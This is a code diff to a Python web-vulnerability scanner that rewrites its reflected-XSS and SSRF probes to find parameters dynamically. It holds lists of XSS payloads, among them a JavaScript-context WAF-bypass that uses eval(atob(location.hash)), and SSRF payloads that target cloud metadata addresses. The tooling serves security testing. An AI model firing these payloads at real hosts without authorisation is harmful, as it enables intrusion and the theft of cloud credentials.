@@ -497,38 +497,29 @@ async def run_cache_poisoning_probe(
 
 
 # ═══════════════════════════════════════════════════════════════════════
-# GAP 3 — Reflected XSS Canary Probe
+# GAP 3 — Reflected XSS Probe (Dynamic Discovery)
 # ═══════════════════════════════════════════════════════════════════════
 #
-# Inject a unique canary string into common reflection points (query
-# params, path segments, fragment). If reflected unencoded in the HTML
-# body, escalate with actual XSS payloads including WAF bypass variants.
+# Fully generic, zero-hardcoded-param XSS detection.
+#
+# 1. **Discover** — fetch the target page, parse all query parameters
+#    from links (<a href>), forms (<form>/<input>), and inline JS. Also
+#    extract bare path segments. This means ANY parameter the app
+#    actually uses gets tested — no static list.
+# 2. **Probe** — inject a unique canary into each discovered param.
+# 3. **Classify** — determine WHERE the canary landed (onclick handler,
+#    <script> block, javascript: URI, HTML body, or safe attribute).
+# 4. **Escalate** — send context-appropriate payloads (JS-breakout for
+#    event handlers, HTML tags for body context) and confirm reflection.
+#
+# This catches the *class* of bugs, not a specific ticket's params.
+
+import re as _re
 
 _XSS_CANARY_PREFIX = "xsscanary"
 
-_XSS_INJECTION_POINTS: list[tuple[str, str]] = [
-    ("query_q", "?q={canary}"),
-    ("query_search", "?search={canary}"),
-    ("query_name", "?name={canary}"),
-    ("query_redirect", "?redirect={canary}"),
-    ("query_url", "?url={canary}"),
-    ("query_callback", "?callback={canary}"),
-    ("query_next", "?next={canary}"),
-    # Tile/asset-server style params (BUGB-3057 pattern: ipm-maptiles/?style=..&key=..)
-    ("query_style", "?style={canary}"),
-    ("query_key", "?key={canary}"),
-    ("query_id", "?id={canary}"),
-    ("query_page", "?page={canary}"),
-    ("query_view", "?view={canary}"),
-    ("query_theme", "?theme={canary}"),
-    ("query_lang", "?lang={canary}"),
-    ("query_locale", "?locale={canary}"),
-    ("path_segment", "/{canary}"),
-]
-
-# HTML-context payloads: trigger when input lands inside the document body
-# outside any quoted attribute / JS string.
-_XSS_PAYLOADS: list[tuple[str, str]] = [
+# HTML-context payloads (canary landed in plain HTML body)
+_XSS_HTML_PAYLOADS: list[tuple[str, str]] = [
     ("basic_script", '<script>alert("XSS")</script>'),
     ("img_onerror", '<img src=x onerror=alert(1)>'),
     ("svg_onload", '<svg onload=alert(1)>'),
@@ -540,75 +531,88 @@ _XSS_PAYLOADS: list[tuple[str, str]] = [
     ("js_uri", 'javascript:alert(1)'),
 ]
 
-# JavaScript-string-context payloads: trigger when input lands inside an
-# onclick=/onload=/<script> JS string literal. These break out of the
-# string and inject code without using <, >, =, /, or = — bypassing the
-# common "block angle brackets" WAF rule. Pattern from BUGB-3057
-# (Avast ipm-maptiles /?style=...).
-#
-# Each tuple is (label, payload). The payload uses {C} as a placeholder
-# for the canary token so we can detect "canary appeared as raw JS"
-# (i.e. the string '-canary-' actually executed) versus "canary appeared
-# encoded" (i.e. the app safely escaped it as &#39;).
-_XSS_JS_CONTEXT_PAYLOADS: list[tuple[str, str]] = [
-    # Single-quote breakout — exact BUGB-3057 shape.
-    ("js_str_squote_break", "x')-{C}-('"),
-    # Double-quote breakout — same pattern with " instead of '.
-    ('js_str_dquote_break', 'x")-{C}-("'),
-    # Backtick (template-literal) breakout — modern JS frameworks.
-    ('js_str_backtick_break', "x`-{C}-`"),
-    # Statement-terminator inside a JS string — drops out, runs canary
-    # as a free identifier, and comments out the rest of the line.
-    ('js_str_squote_terminator', "';{C};//"),
-    ('js_str_dquote_terminator', '";{C};//'),
-    # WAF bypass via location.hash — same shape as BUGB-3057's eval(atob())
-    # exploit, but with canary as the identifier so we can detect
-    # successful injection without actually executing arbitrary code.
-    ('js_str_hash_eval_bypass', "x')-eval(atob(location.hash.slice(1)))/*{C}*/-('"),
+# JS-string-context payloads (canary landed inside onclick/script/js: URI).
+# {C} is replaced with a benign identifier so we can detect breakout
+# without actually running dangerous code.
+_XSS_JS_PAYLOADS: list[tuple[str, str]] = [
+    ("js_squote_break", "x')-{C}-('"),
+    ("js_dquote_break", 'x")-{C}-("'),
+    ("js_backtick_break", "x`-{C}-`"),
+    ("js_squote_terminate", "';{C};//"),
+    ("js_dquote_terminate", '";{C};//'),
+    ("js_hash_eval_bypass", "x')-eval(atob(location.hash.slice(1)))/*{C}*/-('"),
 ]
 
 
-# Regex patterns we use to decide *where* a canary landed in the response.
-# We treat any of these contexts as "JS execution context":
-#   1. inside <script>...canary...</script>
-#   2. inside an event handler attribute  onclick="...canary..." (single or
-#      double quoted; with or without leading/trailing whitespace)
-#   3. inside an inline javascript: URI  href="javascript:...canary..."
+# ── Context classification ────────────────────────────────────────────
 _JS_CONTEXT_REGEXES = [
-    # <script ...>...CANARY...</script>
     (r"<script\b[^>]*>[^<]*{C}[^<]*</script>", "script_block"),
-    # onclick="...CANARY..."  (double-quoted attribute, may contain single quotes)
     (r"\bon[a-z]+\s*=\s*\"[^\"]*{C}[^\"]*\"", "event_handler_attr"),
-    # onclick='...CANARY...'  (single-quoted attribute, may contain double quotes)
     (r"\bon[a-z]+\s*=\s*'[^']*{C}[^']*'", "event_handler_attr"),
-    # href="javascript:...CANARY..." (double-quoted)
     (r"\bhref\s*=\s*\"\s*javascript:[^\"]*{C}[^\"]*\"", "javascript_uri"),
-    # href='javascript:...CANARY...' (single-quoted)
     (r"\bhref\s*=\s*'\s*javascript:[^']*{C}[^']*'", "javascript_uri"),
 ]
 
 
 def _classify_canary_context(body: str, canary: str) -> str | None:
-    """Return one of {'script_block','event_handler_attr','javascript_uri',
-    'html_body'} if the canary is reflected in that context, else None.
-
-    Match priority is JS-context first (most dangerous), then plain HTML
-    body. We don't fire on attribute-quoted reflections that aren't event
-    handlers — those are usually safe (e.g. value="..."`).
-    """
+    """Classify where *canary* landed: 'script_block', 'event_handler_attr',
+    'javascript_uri', 'html_body', or None (safe / not reflected)."""
     if canary not in body:
         return None
-    import re as _re
     for pattern_tpl, ctx_name in _JS_CONTEXT_REGEXES:
         pattern = pattern_tpl.replace("{C}", _re.escape(canary))
         if _re.search(pattern, body, _re.IGNORECASE | _re.DOTALL):
             return ctx_name
-    # Canary present but not in a JS sink. Check it's at least in the
-    # rendered HTML body (not just inside a quoted attribute we don't
-    # care about). The simplest check: canary appears outside any tag.
     if _re.search(r">[^<]*" + _re.escape(canary) + r"[^<]*<", body):
         return "html_body"
     return None
+
+
+# ── Dynamic parameter discovery ───────────────────────────────────────
+
+def _discover_params_from_html(html: str, base_url: str) -> set[str]:
+    """Extract every query-parameter name visible in the page.
+
+    Sources:
+      - <a href="?foo=1&bar=2">      →  {foo, bar}
+      - <form ...><input name="x">   →  {x}
+      - onclick="fn('..?p=...')"     →  {p}
+      - window.location = '?z=1'     →  {z}
+      - <link>/<script src="?v=..">  →  {v}
+
+    Returns a de-duplicated set of parameter names (lowercase).
+    """
+    params: set[str] = set()
+
+    for m in _re.finditer(r'[?&]([A-Za-z_][A-Za-z0-9_-]{0,40})=', html):
+        params.add(m.group(1).lower())
+
+    for m in _re.finditer(
+        r'<input\b[^>]*\bname\s*=\s*["\']?([A-Za-z_][A-Za-z0-9_-]{0,40})',
+        html, _re.IGNORECASE,
+    ):
+        params.add(m.group(1).lower())
+
+    for m in _re.finditer(
+        r'<select\b[^>]*\bname\s*=\s*["\']?([A-Za-z_][A-Za-z0-9_-]{0,40})',
+        html, _re.IGNORECASE,
+    ):
+        params.add(m.group(1).lower())
+
+    for m in _re.finditer(
+        r'<textarea\b[^>]*\bname\s*=\s*["\']?([A-Za-z_][A-Za-z0-9_-]{0,40})',
+        html, _re.IGNORECASE,
+    ):
+        params.add(m.group(1).lower())
+
+    params.discard("")
+    return params
+
+
+# Small fallback set used only when the page returns no discoverable
+# params at all (e.g. a blank/error page). Kept deliberately small.
+_FALLBACK_PARAMS = ["q", "search", "id", "page", "url", "redirect",
+                    "callback", "next", "name"]
 
 
 async def run_reflected_xss_probe(
@@ -619,7 +623,13 @@ async def run_reflected_xss_probe(
     on_progress: callable | None = None,
     cancel_flag=None,
 ) -> list[dict]:
-    """Probe each host for reflected XSS via canary injection + WAF bypass."""
+    """Probe each host for reflected XSS using dynamic parameter discovery.
+
+    For every in-scope host:
+      1. Fetch the root page and discover all query params in the HTML.
+      2. For each param, inject a canary and classify the reflection context.
+      3. Send context-appropriate payloads and confirm verbatim reflection.
+    """
     findings: list[dict] = []
     _emit = on_finding or (lambda f: None)
     _progress = on_progress or (lambda event, data: None)
@@ -640,47 +650,80 @@ async def run_reflected_xss_probe(
             break
         base_url = f"https://{host}"
 
-        # Per-host: build a list of (param_label, tpl, ctx) where the
-        # canary landed. ctx tells us which payload class to escalate
-        # with (HTML body vs JS string).
+        # ── Step 1: Fetch page and discover parameters ────────────
+        try:
+            page_resp = await http_client.get(
+                base_url, timeout=10.0, follow_redirects=True,
+                headers=_PROBE_HEADERS,
+            )
+            page_html = page_resp.text[:500_000]
+        except Exception:
+            page_html = ""
+
+        discovered = _discover_params_from_html(page_html, base_url)
+        if not discovered:
+            discovered = set(_FALLBACK_PARAMS)
+
+        _progress("active_baseline_step", {
+            "host": host, "step": "xss_params_discovered",
+            "count": len(discovered),
+            "params": sorted(discovered)[:30],
+        })
+
+        # ── Step 2: Canary injection + context classification ─────
         reflection_points: list[tuple[str, str, str]] = []
-        for label, tpl in _XSS_INJECTION_POINTS:
+        for param in sorted(discovered):
             if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
                 break
-            test_url = f"{base_url}{tpl.format(canary=canary)}"
+            if len(reflection_points) >= 15:
+                break
+            test_url = f"{base_url}?{param}={canary}"
             try:
                 resp = await http_client.get(
-                    test_url, timeout=10.0, follow_redirects=True, headers=_PROBE_HEADERS,
+                    test_url, timeout=10.0, follow_redirects=True,
+                    headers=_PROBE_HEADERS,
                 )
                 ctx = _classify_canary_context(resp.text[:200_000], canary)
                 if ctx:
-                    reflection_points.append((label, tpl, ctx))
+                    param_tpl = "?" + param + "={canary}"
+                    reflection_points.append((param, param_tpl, ctx))
                     _progress("active_baseline_step", {
                         "host": host, "step": "xss_reflection_found",
-                        "point": label, "context": ctx,
+                        "param": param, "context": ctx,
                     })
             except Exception:
                 continue
 
+        # Also test the path segment as a generic injection point.
+        try:
+            path_url = f"{base_url}/{canary}"
+            path_resp = await http_client.get(
+                path_url, timeout=10.0, follow_redirects=True,
+                headers=_PROBE_HEADERS,
+            )
+            path_ctx = _classify_canary_context(path_resp.text[:200_000], canary)
+            if path_ctx:
+                reflection_points.append(("path_segment", "/{canary}", path_ctx))
+        except Exception:
+            pass
+
         if not reflection_points:
             continue
 
-        # Cap escalation work: 5 reflection points x payloads, first hit
-        # per (point, context) is enough.
-        for point_label, point_tpl, ctx in reflection_points[:5]:
-            payloads_to_try: list[tuple[str, str]]
+        # ── Step 3: Payload escalation per context ────────────────
+        for param_name, param_tpl, ctx in reflection_points[:10]:
             if ctx in ("script_block", "event_handler_attr", "javascript_uri"):
-                payloads_to_try = [
+                payloads = [
                     (lbl, tpl.replace("{C}", "alert(1)"))
-                    for lbl, tpl in _XSS_JS_CONTEXT_PAYLOADS
+                    for lbl, tpl in _XSS_JS_PAYLOADS
                 ]
             else:
-                payloads_to_try = list(_XSS_PAYLOADS)
+                payloads = list(_XSS_HTML_PAYLOADS)
 
-            for payload_label, payload in payloads_to_try:
+            for payload_label, payload in payloads:
                 if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
                     break
-                test_url = f"{base_url}{point_tpl.format(canary=payload)}"
+                test_url = f"{base_url}{param_tpl.format(canary=payload)}"
                 try:
                     resp = await http_client.get(
                         test_url, timeout=10.0, follow_redirects=True,
@@ -693,26 +736,26 @@ async def run_reflected_xss_probe(
                 if payload not in body:
                     continue
 
-                # JS-context findings are always Critical (direct code
-                # execution); HTML-body findings are High.
                 if ctx in ("script_block", "event_handler_attr", "javascript_uri"):
                     sev = "Critical"
-                    title = f"Reflected XSS via JavaScript Context Breakout ({point_label}, {ctx})"
+                    title = (
+                        f"Reflected XSS via JavaScript Context Breakout "
+                        f"({param_name}, {ctx})"
+                    )
                     evidence = (
-                        f"User input from parameter '{point_label}' is reflected "
-                        f"unencoded inside a {ctx.replace('_', ' ')} on {host}. "
-                        f"Payload '{payload_label}' (which contains no <, >, =, /, or "
-                        f"comma — bypassing common WAF rules) successfully broke out "
-                        f"of the JS string context: {payload}. "
-                        f"Pattern matches BUGB-3057 (WAF-bypass JS-context reflection)."
+                        f"User input from parameter '{param_name}' (dynamically "
+                        f"discovered on {host}) is reflected unencoded inside a "
+                        f"{ctx.replace('_', ' ')}. Payload '{payload_label}' "
+                        f"bypasses WAF by avoiding <, >, =, /, comma and breaking "
+                        f"out of the JS string context: {payload}"
                     )
                 else:
                     sev = "High"
-                    title = f"Reflected XSS via {point_label}"
+                    title = f"Reflected XSS via {param_name}"
                     evidence = (
-                        f"Payload '{payload_label}' reflected unencoded in response "
-                        f"body at {test_url}. The payload [{payload}] appears "
-                        f"verbatim in the HTML response, confirming reflected XSS."
+                        f"Payload '{payload_label}' reflected unencoded in the "
+                        f"response body when injected via parameter '{param_name}' "
+                        f"(dynamically discovered on {host}): {payload}"
                     )
 
                 f = {
@@ -722,16 +765,15 @@ async def run_reflected_xss_probe(
                     "owasp_category": "A03:2021",
                     "cwe": "CWE-79",
                     "url": test_url,
-                    "parameter": point_label,
+                    "parameter": param_name,
                     "payload": payload,
                     "evidence": evidence,
                     "remediation": (
-                        "Context-aware escape user input before reflecting it. "
-                        "For JS string contexts, JSON-encode and HTML-escape; "
-                        "for HTML body, HTML-escape; for attribute values, "
-                        "use attribute encoding. Implement a Content-Security-"
-                        "Policy header to mitigate exploitation even if encoding "
-                        "is missed."
+                        "Context-aware encode all user input before reflecting "
+                        "it. For JS string contexts, JSON-encode then HTML-"
+                        "escape; for HTML body, HTML-escape; for attribute "
+                        "values, use attribute encoding. Deploy a strict "
+                        "Content-Security-Policy as defense-in-depth."
                     ),
                     "phase": "Active Baseline (Reflected XSS)",
                     "tool": "active_baseline.reflected_xss_probe",
@@ -750,24 +792,21 @@ async def run_reflected_xss_probe(
 
 
 # ═══════════════════════════════════════════════════════════════════════
-# GAP 4 — SSRF Bypass Probe
+# GAP 4 — SSRF Bypass Probe (Dynamic Discovery)
 # ═══════════════════════════════════════════════════════════════════════
 #
-# Test common SSRF bypass techniques: metadata endpoints with IP
-# encoding variants, redirect chains, cloud provider metadata services.
+# Dynamically discovers URL-accepting parameters on the target page,
+# then tests each with cloud metadata / internal IP bypass payloads.
+# No hardcoded param list — discovery is based on:
+#   a) Page HTML parsing (same as XSS discovery)
+#   b) Semantic filtering: params whose NAME or VALUE suggest URL input.
 
-_SSRF_INJECTION_POINTS: list[tuple[str, str]] = [
-    ("query_url", "?url={payload}"),
-    ("query_redirect", "?redirect={payload}"),
-    ("query_next", "?next={payload}"),
-    ("query_target", "?target={payload}"),
-    ("query_dest", "?dest={payload}"),
-    ("query_return", "?return_to={payload}"),
-    ("query_callback", "?callback={payload}"),
-    ("query_path", "?path={payload}"),
-    ("query_proxy", "?proxy={payload}"),
-    ("query_fetch", "?fetch={payload}"),
-]
+_SSRF_PARAM_NAME_HINTS = _re.compile(
+    r"(url|uri|href|link|src|redirect|redir|next|goto|dest|target"
+    r"|return|callback|proxy|fetch|path|endpoint|resource|load|open"
+    r"|file|page|site|domain|host|image|img|icon|logo|download|ref)",
+    _re.IGNORECASE,
+)
 
 _SSRF_PAYLOADS: list[tuple[str, str, str]] = [
     ("aws_metadata_plain", "http://169.254.169.254/latest/meta-data/", "ami-id"),
@@ -783,6 +822,35 @@ _SSRF_PAYLOADS: list[tuple[str, str, str]] = [
     ("localhost_0000", "http://0.0.0.0/", ""),
 ]
 
+_SSRF_FALLBACK_PARAMS = ["url", "redirect", "next", "target", "dest",
+                         "callback", "path", "proxy", "fetch"]
+
+
+def _discover_ssrf_params(html: str) -> list[str]:
+    """From page HTML, discover params likely to accept URLs.
+
+    Strategy:
+      1. Parse all param names from the page (same as XSS discovery).
+      2. Also find params whose VALUES look like URLs (http/https//).
+      3. Filter by name heuristic (the name regex above).
+      4. Return deduplicated list.
+    """
+    all_params = _discover_params_from_html(html, "")
+
+    url_value_params: set[str] = set()
+    for m in _re.finditer(
+        r'[?&]([A-Za-z_][A-Za-z0-9_-]{0,40})=(https?%3[Aa]|https?://|//)',
+        html,
+    ):
+        url_value_params.add(m.group(1).lower())
+
+    candidates: set[str] = set()
+    for p in all_params:
+        if _SSRF_PARAM_NAME_HINTS.search(p):
+            candidates.add(p)
+    candidates.update(url_value_params)
+    return sorted(candidates) if candidates else list(_SSRF_FALLBACK_PARAMS)
+
 
 async def run_ssrf_probe(
     http_client,
@@ -792,7 +860,7 @@ async def run_ssrf_probe(
     on_progress: callable | None = None,
     cancel_flag=None,
 ) -> list[dict]:
-    """Probe each host for SSRF via URL parameter injection with bypass techniques."""
+    """Probe each host for SSRF using dynamically discovered URL params."""
     findings: list[dict] = []
     _emit = on_finding or (lambda f: None)
     _progress = on_progress or (lambda event, data: None)
@@ -810,10 +878,26 @@ async def run_ssrf_probe(
             break
         base_url = f"https://{host}"
 
-        for point_label, point_tpl in _SSRF_INJECTION_POINTS:
+        # Discover URL-accepting params from the page
+        try:
+            page_resp = await http_client.get(
+                base_url, timeout=10.0, follow_redirects=True,
+                headers=_PROBE_HEADERS,
+            )
+            page_html = page_resp.text[:500_000]
+        except Exception:
+            page_html = ""
+
+        ssrf_params = _discover_ssrf_params(page_html)
+        _progress("active_baseline_step", {
+            "host": host, "step": "ssrf_params_discovered",
+            "count": len(ssrf_params), "params": ssrf_params[:20],
+        })
+
+        for param in ssrf_params[:15]:
             if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
                 break
-            benign_url = f"{base_url}{point_tpl.format(payload='https://example.com/')}"
+            benign_url = f"{base_url}?{param}=https://example.com/"
             try:
                 benign_resp = await http_client.get(
                     benign_url, timeout=10.0, follow_redirects=False,
@@ -829,7 +913,7 @@ async def run_ssrf_probe(
             for payload_label, payload_url, fingerprint in _SSRF_PAYLOADS:
                 if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
                     break
-                test_url = f"{base_url}{point_tpl.format(payload=payload_url)}"
+                test_url = f"{base_url}?{param}={payload_url}"
                 try:
                     resp = await http_client.get(
                         test_url, timeout=10.0, follow_redirects=False,
@@ -845,31 +929,34 @@ async def run_ssrf_probe(
 
                 if fingerprint and fingerprint in body:
                     is_ssrf = True
-                    evidence_detail = f"Cloud metadata fingerprint '{fingerprint}' found in response body."
+                    evidence_detail = (
+                        f"Cloud metadata fingerprint '{fingerprint}' in response."
+                    )
                 elif (status == 200 and benign_status != 200
                       and len(body) > 100
                       and "169.254" not in str(benign_resp.text[:1000])):
                     is_ssrf = True
                     evidence_detail = (
-                        f"Status changed from {benign_status} (benign) to {status} (SSRF payload). "
-                        f"Response body length: {len(body)} chars."
+                        f"Status changed from {benign_status} (benign) to "
+                        f"{status} (SSRF payload). Body length: {len(body)}."
                     )
 
                 if not is_ssrf:
                     continue
 
                 f = {
-                    "title": f"SSRF via {point_label} ({payload_label})",
+                    "title": f"SSRF via {param} ({payload_label})",
                     "severity": "Critical" if "metadata" in payload_label else "High",
                     "confidence": "High" if fingerprint else "Medium",
                     "owasp_category": "A10:2021",
                     "cwe": "CWE-918",
                     "url": test_url,
-                    "parameter": point_label,
+                    "parameter": param,
                     "payload": payload_url,
                     "evidence": (
                         f"SSRF bypass payload '{payload_label}' ({payload_url}) "
-                        f"injected via {point_label}. {evidence_detail}"
+                        f"injected via dynamically discovered param '{param}'. "
+                        f"{evidence_detail}"
                     ),
                     "remediation": (
                         "Validate and sanitize all URL inputs server-side. "
@@ -898,4 +985,7 @@ __all__ = [
     "run_cache_poisoning_probe",
     "run_reflected_xss_probe",
     "run_ssrf_probe",
+    "_discover_params_from_html",
+    "_discover_ssrf_params",
+    "_classify_canary_context",
 ]
